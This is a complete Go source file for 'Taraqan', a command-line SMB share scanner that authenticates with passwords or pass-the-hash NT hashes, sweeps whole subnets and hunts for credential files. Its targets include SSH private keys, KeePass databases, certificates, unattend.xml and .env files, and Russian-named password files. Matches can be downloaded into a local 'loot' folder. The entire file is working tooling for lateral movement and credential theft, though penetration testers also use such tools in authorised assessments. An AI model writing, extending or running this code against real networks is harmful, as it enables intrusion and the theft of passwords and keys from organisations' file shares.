package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/binary"
	"encoding/csv"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unicode/utf8"

	"github.com/hirochachacha/go-smb2"
	"github.com/spf13/cobra"
	"golang.org/x/text/encoding/charmap"
)

// ============================================================================
// Default Patterns
// ============================================================================

var defaultPatterns = []string{
	// Password files
	"*password*", "*passwd*", "*credential*", "*secret*",
	// Config files
	"web.config", "*.config", "*.ini", "*.conf", "*.cfg",
	// Database
	"*.sql", "*.sqlite", "*.db", "*.mdb",
	// Keys and certificates
	"*.kdbx", "*.key", "*.pem", "*.pfx", "*.p12", "*.jks",
	"id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "*.ppk",
	// Scripts with potential creds
	"*.bat", "*.ps1", "*.vbs", "*.cmd",
	// Documents
	"*cred*.txt", "*pass*.txt", "*login*.txt",
	"*.rdp", "*.rdg",
	// Backup files
	"*.bak", "*.backup", "*.old",
	// AWS/Cloud
	"credentials", ".env", "*.env",
	// Other sensitive
	"unattend.xml", "sysprep.xml", "groups.xml",
	"*.vnc", "ultravnc.ini", "*.pcf",
	// Russian patterns
	"*пароль*", "*парол*", "*учетк*", "*учётк*", "*логин*",
	"*секрет*", "*ключ*", "*креды*", "*доступ*", "*авториз*",
	"*password*.xlsx", "*пароли*.xlsx", "*учетки*.xlsx",
	"*password*.docx", "*пароли*.docx", "*учетки*.docx",
	// Common sensitive files in CIS environments
	"*АРМ*", "*ЭЦП*", "*VPN*", "*vpn*",
	"*ip адрес*", "*hosts*", "*удаленк*",
	"*сертификат*", "*backup*", "*бэкап*", "*бекап*",
}

// Default extensions to exclude (binaries, system files)
var defaultExcludeExt = []string{
	"exe", "dll", "sys", "drv", "ocx", "cpl", "scr",
	"msi", "msp", "msu", "cab",
	"tmp", "log", "etl",
	"jpg", "jpeg", "png", "gif", "bmp", "ico", "svg", "webp",
	"mp3", "mp4", "avi", "mkv", "mov", "wmv", "flv",
	"zip", "rar", "7z", "gz", "tar", "iso",
	"ttf", "otf", "woff", "woff2", "eot",
}

// Directories to skip (case-insensitive)
var skipDirs = map[string]bool{
	"windows":                   true,
	"program files":             true,
	"program files (x86)":       true,
	"programdata":               true,
	"$recycle.bin":              true,
	"system volume information": true,
	"$windows.~bt":              true,
	"$windows.~ws":              true,
	"$winreagent":               true,
	"appdata":                   true,
	"local settings":            true,
	"application data":          true,
	"winsxs":                    true,
	"assembly":                  true,
	"microsoft.net":             true,
	"windowsapps":               true,
	"servicing":                 true,
	"installer":                 true,
	"drivers":                   true,
	"catroot":                   true,
	"catroot2":                  true,
	"driverstore":               true,
	"logs":                      true,
	"temp":                      true,
	"cache":                     true,
}

// ============================================================================
// Data Types
// ============================================================================

type FileMatch struct {
	Host     string `json:"host"`
	Share    string `json:"share"`
	Path     string `json:"path"`
	Filename string `json:"filename"`
	Size     int64  `json:"size"`
	Pattern  string `json:"pattern"`
	Modified string `json:"modified,omitempty"`
}

type ScanResult struct {
	Host       string      `json:"host"`
	Accessible bool        `json:"accessible"`
	Shares     []string    `json:"shares"`
	Matches    []FileMatch `json:"matches"`
	Error      string      `json:"error,omitempty"`
}

type ScanConfig struct {
	Username        string
	Domain          string
	Password        string
	NTHash          string
	Threads         int
	ShareThreads    int
	MaxDepth        int
	Timeout         time.Duration
	ShareTimeout    time.Duration
	Patterns        []string
	PatternsLower   []string // Pre-lowercased patterns for faster matching
	ExcludeExt      map[string]bool
	Verbose         bool
	OutputFile      string
	Format          string
	SkipAdminShare  bool
	Download        bool
	DownloadDir     string
	MaxDownloadSize int64
	MatchCounter    *int64 // Real-time match counter for progress bar
}

// ============================================================================
// Pattern Matcher (Optimized)
// ============================================================================

// PreparePatterns pre-processes patterns for faster matching
func (c *ScanConfig) PreparePatterns() {
	c.PatternsLower = make([]string, len(c.Patterns))
	for i, p := range c.Patterns {
		c.PatternsLower[i] = strings.ToLower(p)
	}
}

// matchPatternFast uses pre-lowercased patterns
func matchPatternFast(filenameLower string, patternsLower, patterns []string) string {
	for i, pattern := range patternsLower {
		matched, _ := filepath.Match(pattern, filenameLower)
		if matched {
			return patterns[i] // Return original pattern for display
		}
	}
	return ""
}

// getExtLower extracts lowercase extension without allocation for common cases
func getExtLower(filename string) string {
	for i := len(filename) - 1; i >= 0; i-- {
		if filename[i] == '.' {
			ext := filename[i+1:]
			// Fast path for ASCII lowercase
			needsLower := false
			for j := 0; j < len(ext); j++ {
				if ext[j] >= 'A' && ext[j] <= 'Z' {
					needsLower = true
					break
				}
			}
			if !needsLower {
				return ext
			}
			return strings.ToLower(ext)
		}
	}
	return ""
}

func shouldExcludeByExt(filename string, excludeExt map[string]bool) bool {
	if len(excludeExt) == 0 {
		return false
	}
	return excludeExt[getExtLower(filename)]
}

// ============================================================================
// SMB Scanner
// ============================================================================

func checkPort(host string, port int, timeout time.Duration) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

// uniqueFilePath returns a unique file path by adding _1, _2, etc. suffix if file exists
func uniqueFilePath(path string) string {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return path
	}

	ext := filepath.Ext(path)
	base := strings.TrimSuffix(path, ext)

	for i := 1; i < 1000; i++ {
		newPath := fmt.Sprintf("%s_%d%s", base, i, ext)
		if _, err := os.Stat(newPath); os.IsNotExist(err) {
			return newPath
		}
	}
	return path
}

// ============================================================================
// Encoding Detection and Conversion
// ============================================================================

// textFileExtensions contains extensions that should be converted to UTF-8
var textFileExtensions = map[string]bool{
	".txt": true, ".ini": true, ".config": true, ".xml": true,
	".env": true, ".log": true, ".cfg": true, ".conf": true,
	".json": true, ".yml": true, ".yaml": true, ".md": true,
	".bat": true, ".ps1": true, ".vbs": true, ".cmd": true,
}

// isTextFile checks if file should be converted to UTF-8
func isTextFile(filename string) bool {
	ext := strings.ToLower(filepath.Ext(filename))
	return textFileExtensions[ext]
}

// detectAndConvertToUTF8 detects encoding and converts to UTF-8
func detectAndConvertToUTF8(data []byte) []byte {
	if len(data) == 0 {
		return data
	}

	// Check for UTF-8 BOM
	if len(data) >= 3 && data[0] == 0xEF && data[1] == 0xBB && data[2] == 0xBF {
		return data[3:] // Already UTF-8, strip BOM
	}

	// Check for UTF-16 LE BOM (FF FE)
	if len(data) >= 2 && data[0] == 0xFF && data[1] == 0xFE {
		return decodeUTF16LE(data[2:])
	}

	// Check for UTF-16 BE BOM (FE FF)
	if len(data) >= 2 && data[0] == 0xFE && data[1] == 0xFF {
		return decodeUTF16BE(data[2:])
	}

	// Check if already valid UTF-8
	if utf8.Valid(data) {
		return data
	}

	// Try Windows-1251 (Cyrillic)
	if looksLikeWindows1251(data) {
		return decodeWindows1251(data)
	}

	// Return as-is if can't detect
	return data
}

// decodeUTF16LE converts UTF-16 Little Endian to UTF-8
func decodeUTF16LE(data []byte) []byte {
	if len(data)%2 != 0 {
		data = data[:len(data)-1]
	}

	var buf bytes.Buffer
	for i := 0; i < len(data); i += 2 {
		r := rune(binary.LittleEndian.Uint16(data[i:]))
		buf.WriteRune(r)
	}
	return buf.Bytes()
}

// decodeUTF16BE converts UTF-16 Big Endian to UTF-8
func decodeUTF16BE(data []byte) []byte {
	if len(data)%2 != 0 {
		data = data[:len(data)-1]
	}

	var buf bytes.Buffer
	for i := 0; i < len(data); i += 2 {
		r := rune(binary.BigEndian.Uint16(data[i:]))
		buf.WriteRune(r)
	}
	return buf.Bytes()
}

// decodeWindows1251 converts Windows-1251 (Cyrillic) to UTF-8
func decodeWindows1251(data []byte) []byte {
	decoder := charmap.Windows1251.NewDecoder()
	result, err := decoder.Bytes(data)
	if err != nil {
		return data
	}
	return result
}

// looksLikeWindows1251 heuristically checks if data looks like Windows-1251
func looksLikeWindows1251(data []byte) bool {
	// Count bytes in Windows-1251 Cyrillic range (0xC0-0xFF)
	cyrillicCount := 0
	for _, b := range data {
		if b >= 0xC0 && b <= 0xFF {
			cyrillicCount++
		}
	}
	// If more than 10% of bytes are in Cyrillic range, likely Windows-1251
	return len(data) > 0 && float64(cyrillicCount)/float64(len(data)) > 0.1
}

// downloadFile downloads a file from SMB share with buffered I/O and UTF-8 conversion
func downloadFile(shareFS *smb2.Share, remotePath, localPath string, maxSize int64) error {
	remoteFile, err := shareFS.Open(remotePath)
	if err != nil {
		return fmt.Errorf("open: %w", err)
	}
	defer remoteFile.Close()

	info, err := remoteFile.Stat()
	if err != nil {
		return fmt.Errorf("stat: %w", err)
	}
	if info.Size() > maxSize {
		return fmt.Errorf("too large: %d > %d bytes", info.Size(), maxSize)
	}

	if err := os.MkdirAll(filepath.Dir(localPath), 0755); err != nil {
		return fmt.Errorf("mkdir: %w", err)
	}

	// Read file into memory
	data, err := io.ReadAll(remoteFile)
	if err != nil {
		return fmt.Errorf("read: %w", err)
	}

	// Convert text files to UTF-8
	filename := filepath.Base(localPath)
	if isTextFile(filename) {
		data = detectAndConvertToUTF8(data)
	}

	// Write to local file
	localFile, err := os.Create(localPath)
	if err != nil {
		return fmt.Errorf("create: %w", err)
	}
	defer localFile.Close()

	bufWriter := bufio.NewWriterSize(localFile, 64*1024)
	_, err = bufWriter.Write(data)
	if err != nil {
		return fmt.Errorf("write: %w", err)
	}
	return bufWriter.Flush()
}

// scanShare scans a single share with timeout
func scanShare(ctx context.Context, session *smb2.Session, host, shareName string, config *ScanConfig) []FileMatch {
	matches := make([]FileMatch, 0, 16) // Pre-allocate with expected capacity

	shareFS, err := session.Mount(shareName)
	if err != nil {
		if config.Verbose {
			fmt.Printf("  [-] %s: %v\n", shareName, err)
		}
		return matches
	}
	defer shareFS.Umount()

	if config.Verbose {
		fmt.Printf("  [*] Scanning %s...\n", shareName)
	}

	dirFS := shareFS.DirFS(".")
	var filesScanned int64
	startTime := time.Now()

	// Pre-compute depth separator
	pathSep := string(os.PathSeparator)

	err = fs.WalkDir(dirFS, ".", func(path string, d fs.DirEntry, err error) error {
		// Check context cancellation (timeout) - check less frequently
		if filesScanned%100 == 0 {
			select {
			case <-ctx.Done():
				return ctx.Err()
			default:
			}
		}

		if err != nil {
			return nil
		}

		// Check depth - optimized counting
		currentDepth := strings.Count(path, pathSep) + strings.Count(path, "/")
		if currentDepth > config.MaxDepth {
			if d.IsDir() {
				return fs.SkipDir
			}
			return nil
		}

		// Skip system directories
		if d.IsDir() {
			if skipDirs[strings.ToLower(d.Name())] {
				return fs.SkipDir
			}
			return nil
		}

		filename := d.Name()

		// Early extension check (before pattern matching)
		if shouldExcludeByExt(filename, config.ExcludeExt) {
			return nil
		}

		atomic.AddInt64(&filesScanned, 1)
		count := atomic.LoadInt64(&filesScanned)
		if config.Verbose && count%5000 == 0 {
			elapsed := time.Since(startTime).Seconds()
			rate := float64(count) / elapsed
			fmt.Printf("  [*] %s: %d files (%.0f/s)...\n", shareName, count, rate)
		}

		// Pattern matching with pre-lowercased patterns
		filenameLower := strings.ToLower(filename)
		pattern := matchPatternFast(filenameLower, config.PatternsLower, config.Patterns)
		if pattern != "" {
			info, _ := d.Info()
			var size int64
			var modTime string
			if info != nil {
				size = info.Size()
				modTime = info.ModTime().Format(time.RFC3339)
			}

			match := FileMatch{
				Host:     host,
				Share:    shareName,
				Path:     path,
				Filename: filename,
				Size:     size,
				Pattern:  pattern,
				Modified: modTime,
			}
			matches = append(matches, match)

			// Update real-time match counter
			if config.MatchCounter != nil {
				atomic.AddInt64(config.MatchCounter, 1)
			}

			if config.Verbose {
				fmt.Printf("  [!] Found: \\\\%s\\%s\\%s\n", host, shareName, path)
			}

			// Download file if enabled
			if config.Download && size <= config.MaxDownloadSize && size > 0 {
				localPath := uniqueFilePath(filepath.Join(config.DownloadDir, host, filename))
				dlErr := downloadFile(shareFS, path, localPath, config.MaxDownloadSize)
				if dlErr != nil {
					if config.Verbose {
						fmt.Printf("  [-] Download failed: %v\n", dlErr)
					}
				} else if config.Verbose {
					fmt.Printf("  [↓] Downloaded: %s\n", localPath)
				}
			}
		}
		return nil
	})

	if err != nil {
		if err == context.DeadlineExceeded {
			if config.Verbose {
				fmt.Printf("  [!] %s: timeout after %d files\n", shareName, atomic.LoadInt64(&filesScanned))
			}
		} else if config.Verbose {
			fmt.Printf("  [-] Walk error on %s: %v\n", shareName, err)
		}
	}

	if config.Verbose {
		elapsed := time.Since(startTime).Seconds()
		fmt.Printf("  [+] %s: done (%d files in %.1fs)\n", shareName, atomic.LoadInt64(&filesScanned), elapsed)
	}

	return matches
}

func scanHost(host string, config *ScanConfig) ScanResult {
	result := ScanResult{
		Host:    host,
		Shares:  make([]string, 0, 8),
		Matches: make([]FileMatch, 0, 16),
	}

	// Quick port check
	if !checkPort(host, 445, config.Timeout) {
		result.Error = "port 445 closed"
		return result
	}

	// Connect with timeout
	dialer := net.Dialer{Timeout: config.Timeout}
	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:445", host))
	if err != nil {
		result.Error = fmt.Sprintf("connection failed: %v", err)
		return result
	}
	defer conn.Close()

	// Create NTLM initiator
	var initiator smb2.Initiator

	if config.NTHash != "" {
		hashBytes, err := hex.DecodeString(config.NTHash)
		if err != nil {
			result.Error = fmt.Sprintf("invalid NT hash: %v", err)
			return result
		}
		initiator = &smb2.NTLMInitiator{
			User:   config.Username,
			Domain: config.Domain,
			Hash:   hashBytes,
		}
	} else {
		initiator = &smb2.NTLMInitiator{
			User:     config.Username,
			Domain:   config.Domain,
			Password: config.Password,
		}
	}

	d := &smb2.Dialer{
		Initiator: initiator,
	}

	session, err := d.Dial(conn)
	if err != nil {
		result.Error = fmt.Sprintf("auth failed: %v", err)
		return result
	}
	defer session.Logoff()

	result.Accessible = true

	// List shares
	shares, err := session.ListSharenames()
	if err != nil {
		result.Error = fmt.Sprintf("list shares failed: %v", err)
		return result
	}

	// Filter shares
	for _, share := range shares {
		upperShare := strings.ToUpper(share)
		if upperShare == "IPC$" || upperShare == "PRINT$" {
			continue
		}
		if config.SkipAdminShare && strings.HasSuffix(upperShare, "$") {
			continue
		}
		result.Shares = append(result.Shares, share)
	}

	if config.Verbose {
		fmt.Printf("[+] %s - Shares: %s\n", host, strings.Join(result.Shares, ", "))
	}

	// Scan shares in parallel
	var wg sync.WaitGroup
	var mu sync.Mutex
	sem := make(chan struct{}, config.ShareThreads)

	for _, shareName := range result.Shares {
		wg.Add(1)
		sem <- struct{}{}

		go func(share string) {
			defer wg.Done()
			defer func() { <-sem }()

			ctx, cancel := context.WithTimeout(context.Background(), config.ShareTimeout)
			defer cancel()

			matches := scanShare(ctx, session, host, share, config)

			mu.Lock()
			result.Matches = append(result.Matches, matches...)
			mu.Unlock()
		}(shareName)
	}

	wg.Wait()
	return result
}

// ============================================================================
// Subnet Expansion
// ============================================================================

func expandCIDR(cidr string) ([]string, error) {
	if !strings.Contains(cidr, "/") {
		return []string{cidr}, nil
	}

	_, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}

	// Pre-allocate based on expected size
	ones, bits := ipNet.Mask.Size()
	expectedSize := 1 << (bits - ones)
	if expectedSize > 65536 {
		expectedSize = 65536 // Cap for safety
	}
	hosts := make([]string, 0, expectedSize)

	for ip := ipNet.IP.Mask(ipNet.Mask); ipNet.Contains(ip); inc(ip) {
		if ones < bits {
			if ip[len(ip)-1] == 0 || ip[len(ip)-1] == 255 {
				continue
			}
		}
		hosts = append(hosts, ip.String())
	}

	if len(hosts) > 2 {
		hosts = hosts[1 : len(hosts)-1]
	}

	return hosts, nil
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// ============================================================================
// Pattern Loading
// ============================================================================

func loadPatterns(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	patterns := make([]string, 0, 64) // Pre-allocate
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			patterns = append(patterns, line)
		}
	}
	return patterns, scanner.Err()
}

// ============================================================================
// Results Export
// ============================================================================

func exportJSON(results []ScanResult, path string) error {
	file, err := os.Create(path)
	if err != nil {
		return err
	}
	defer file.Close()

	// Use buffered writer
	buf := bufio.NewWriterSize(file, 64*1024)
	encoder := json.NewEncoder(buf)
	encoder.SetIndent("", "  ")
	if err := encoder.Encode(results); err != nil {
		return err
	}
	return buf.Flush()
}

func exportCSV(results []ScanResult, path string) error {
	file, err := os.Create(path)
	if err != nil {
		return err
	}
	defer file.Close()

	buf := bufio.NewWriterSize(file, 64*1024)
	writer := csv.NewWriter(buf)

	writer.Write([]string{"Host", "Share", "Path", "Filename", "Size", "Pattern", "Modified"})

	for _, r := range results {
		for _, m := range r.Matches {
			writer.Write([]string{
				m.Host, m.Share, m.Path, m.Filename,
				fmt.Sprintf("%d", m.Size), m.Pattern, m.Modified,
			})
		}
	}
	writer.Flush()
	return buf.Flush()
}

func printSummary(results []ScanResult) {
	totalHosts := len(results)
	accessible := 0
	totalMatches := 0

	for _, r := range results {
		if r.Accessible {
			accessible++
		}
		totalMatches += len(r.Matches)
	}

	fmt.Println()
	fmt.Println(strings.Repeat("=", 60))
	fmt.Println("SCAN SUMMARY")
	fmt.Println(strings.Repeat("=", 60))
	fmt.Printf("Total hosts scanned: %d\n", totalHosts)
	fmt.Printf("Accessible hosts:    %d\n", accessible)
	fmt.Printf("Sensitive files:     %d\n", totalMatches)

	if totalMatches > 0 {
		fmt.Println()
		fmt.Println(strings.Repeat("=", 60))
		fmt.Println("FINDINGS")
		fmt.Println(strings.Repeat("=", 60))
		for _, r := range results {
			if len(r.Matches) > 0 {
				fmt.Printf("\n[%s]\n", r.Host)
				for _, m := range r.Matches {
					fmt.Printf("  \\\\%s\\%s\\%s\n", m.Host, m.Share, m.Path)
					fmt.Printf("     Size: %d bytes | Pattern: %s\n", m.Size, m.Pattern)
				}
			}
		}
	}
}

// ============================================================================
// Main Scanner
// ============================================================================

func runScan(targets []string, config *ScanConfig) []ScanResult {
	results := make([]ScanResult, 0, len(targets))
	var mu sync.Mutex
	var wg sync.WaitGroup

	sem := make(chan struct{}, config.Threads)
	total := len(targets)
	var done int64
	var accessible int64
	var matchCounter int64
	config.MatchCounter = &matchCounter // Set real-time counter

	for _, target := range targets {
		wg.Add(1)
		sem <- struct{}{}

		go func(t string) {
			defer wg.Done()
			defer func() { <-sem }()

			result := scanHost(t, config)

			mu.Lock()
			results = append(results, result)
			current := atomic.AddInt64(&done, 1)

			if result.Accessible {
				atomic.AddInt64(&accessible, 1)
			}

			if !config.Verbose {
				// Clear line and print progress
				pct := float64(current) / float64(total) * 100
				bar := progressBar(int(pct), 20)
				fmt.Printf("\r\033[K[%s] %5.1f%% (%d/%d) | Accessible: %d | Matches: %d",
					bar, pct, current, total,
					atomic.LoadInt64(&accessible),
					atomic.LoadInt64(&matchCounter))
			}
			mu.Unlock()
		}(target)
	}

	wg.Wait()

	if !config.Verbose {
		fmt.Println()
	}

	return results
}

// progressBar creates a simple progress bar string
func progressBar(pct, width int) string {
	filled := pct * width / 100
	if filled > width {
		filled = width
	}
	bar := strings.Repeat("█", filled) + strings.Repeat("░", width-filled)
	return bar
}

// ============================================================================
// CLI
// ============================================================================

func main() {
	var config ScanConfig
	var patternsArg string
	var excludeExtArg string
	var noExcludeExt bool
	var maxDownloadSizeMB int64

	rootCmd := &cobra.Command{
		Use:   "taraqan",
		Short: "Taraqan - SMB Share Scanner with Pass-the-Hash",
		Long: `Taraqan - SMB Share Scanner for penetration testing.
Scans SMB shares across subnets for sensitive files using PTH authentication.`,
		Example: `  # Scan subnet with PTH (NT hash)
  taraqan -t 192.168.1.0/24 -u admin -d CORP -H 31d6cfe0d16ae931b73c59d7e0c089c0

  # Scan with password, skip admin shares
  taraqan -t 10.0.0.10 -u admin -d DOMAIN -p "Password123" --skip-admin

  # Download matched files
  taraqan -t 10.0.0.0/24 -u admin -H hash --patterns "*.kdbx,*пароль*" --download`,
		Run: func(cmd *cobra.Command, args []string) {
			target, _ := cmd.Flags().GetString("target")
			if target == "" {
				fmt.Println("Error: target is required")
				os.Exit(1)
			}

			// Parse patterns
			if patternsArg != "" {
				if _, err := os.Stat(patternsArg); err == nil {
					patterns, err := loadPatterns(patternsArg)
					if err != nil {
						fmt.Printf("Error loading patterns: %v\n", err)
						os.Exit(1)
					}
					config.Patterns = patterns
				} else {
					config.Patterns = strings.Split(patternsArg, ",")
					for i := range config.Patterns {
						config.Patterns[i] = strings.TrimSpace(config.Patterns[i])
					}
				}
			} else {
				config.Patterns = defaultPatterns
			}

			// Pre-process patterns for faster matching
			config.PreparePatterns()

			// Parse exclude extensions
			if noExcludeExt {
				config.ExcludeExt = nil
			} else if excludeExtArg != "" {
				config.ExcludeExt = make(map[string]bool)
				for _, ext := range strings.Split(excludeExtArg, ",") {
					config.ExcludeExt[strings.TrimSpace(strings.ToLower(ext))] = true
				}
			} else {
				config.ExcludeExt = make(map[string]bool, len(defaultExcludeExt))
				for _, ext := range defaultExcludeExt {
					config.ExcludeExt[ext] = true
				}
			}

			// Expand targets
			targets, err := expandCIDR(target)
			if err != nil {
				fmt.Printf("Error parsing target: %v\n", err)
				os.Exit(1)
			}

			// Validate auth
			if config.NTHash == "" && config.Password == "" {
				fmt.Println("Error: either -H (hash) or -p (password) is required")
				os.Exit(1)
			}

			// Clean up hash
			if strings.Contains(config.NTHash, ":") {
				parts := strings.Split(config.NTHash, ":")
				if len(parts) == 2 {
					config.NTHash = parts[1]
				}
			}

			// Convert MB to bytes
			config.MaxDownloadSize = maxDownloadSizeMB * 1024 * 1024

			// Print banner
			fmt.Println(`
╔═══════════════════════════════════════════════════════════════╗
║                   Taraqan SMB Share Scanner                   ║
╚═══════════════════════════════════════════════════════════════╝`)
			fmt.Printf("\n[*] Target:        %s (%d hosts)\n", target, len(targets))
			fmt.Printf("[*] User:          %s\\%s\n", config.Domain, config.Username)
			fmt.Printf("[*] Auth:          %s\n", func() string {
				if config.NTHash != "" {
					return "PTH (NT Hash)"
				}
				return "Password"
			}())
			fmt.Printf("[*] Patterns:      %d rules\n", len(config.Patterns))
			fmt.Printf("[*] Host threads:  %d\n", config.Threads)
			fmt.Printf("[*] Share threads: %d\n", config.ShareThreads)
			fmt.Printf("[*] Share timeout: %s\n", config.ShareTimeout)
			fmt.Printf("[*] Depth:         %d\n", config.MaxDepth)
			if config.SkipAdminShare {
				fmt.Printf("[*] Skip admin$:   yes\n")
			}
			if config.Download {
				fmt.Printf("[*] Download:      %s (max %dMB)\n", config.DownloadDir, maxDownloadSizeMB)
			}
			fmt.Println()

			fmt.Println("[*] Starting scan...")
			fmt.Println()

			startTime := time.Now()
			results := runScan(targets, &config)
			elapsed := time.Since(startTime)

			printSummary(results)
			fmt.Printf("\n[*] Scan completed in %s\n", elapsed.Round(time.Millisecond))

			if config.OutputFile != "" {
				var err error
				if config.Format == "csv" {
					err = exportCSV(results, config.OutputFile)
				} else {
					err = exportJSON(results, config.OutputFile)
				}
				if err != nil {
					fmt.Printf("[!] Export error: %v\n", err)
				} else {
					fmt.Printf("[*] Results exported to: %s\n", config.OutputFile)
				}
			}
		},
	}

	// Flags
	rootCmd.Flags().StringP("target", "t", "", "Target IP, hostname, or CIDR range (required)")
	rootCmd.Flags().StringVarP(&config.Username, "username", "u", "", "Username for authentication (required)")
	rootCmd.Flags().StringVarP(&config.Domain, "domain", "d", ".", "Domain name")
	rootCmd.Flags().StringVarP(&config.Password, "password", "p", "", "Password for authentication")
	rootCmd.Flags().StringVarP(&config.NTHash, "hash", "H", "", "NT hash for PTH (format: NT or LM:NT)")
	rootCmd.Flags().StringVar(&patternsArg, "patterns", "", "Comma-separated patterns or path to pattern file")
	rootCmd.Flags().IntVar(&config.Threads, "threads", 10, "Host scan threads")
	rootCmd.Flags().IntVar(&config.ShareThreads, "share-threads", 3, "Parallel shares per host")
	rootCmd.Flags().IntVar(&config.MaxDepth, "depth", 5, "Max directory depth")
	rootCmd.Flags().DurationVar(&config.Timeout, "timeout", 5*time.Second, "Connection timeout")
	rootCmd.Flags().DurationVar(&config.ShareTimeout, "share-timeout", 2*time.Minute, "Timeout per share")
	rootCmd.Flags().StringVarP(&config.OutputFile, "output", "o", "", "Output file path")
	rootCmd.Flags().StringVar(&config.Format, "format", "json", "Output format (json/csv)")
	rootCmd.Flags().BoolVarP(&config.Verbose, "verbose", "v", false, "Verbose output")
	rootCmd.Flags().BoolVar(&config.SkipAdminShare, "skip-admin", false, "Skip admin shares (ADMIN$, C$, etc.)")
	rootCmd.Flags().StringVar(&excludeExtArg, "exclude-ext", "", "Extensions to exclude (comma-sep)")
	rootCmd.Flags().BoolVar(&noExcludeExt, "no-exclude-ext", false, "Don't exclude any extensions")
	rootCmd.Flags().BoolVar(&config.Download, "download", false, "Download matched files")
	rootCmd.Flags().StringVar(&config.DownloadDir, "download-dir", "./loot", "Directory for downloads")
	rootCmd.Flags().Int64Var(&maxDownloadSizeMB, "max-size", 10, "Max file size to download in MB")

	rootCmd.MarkFlagRequired("target")
	rootCmd.MarkFlagRequired("username")

	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}
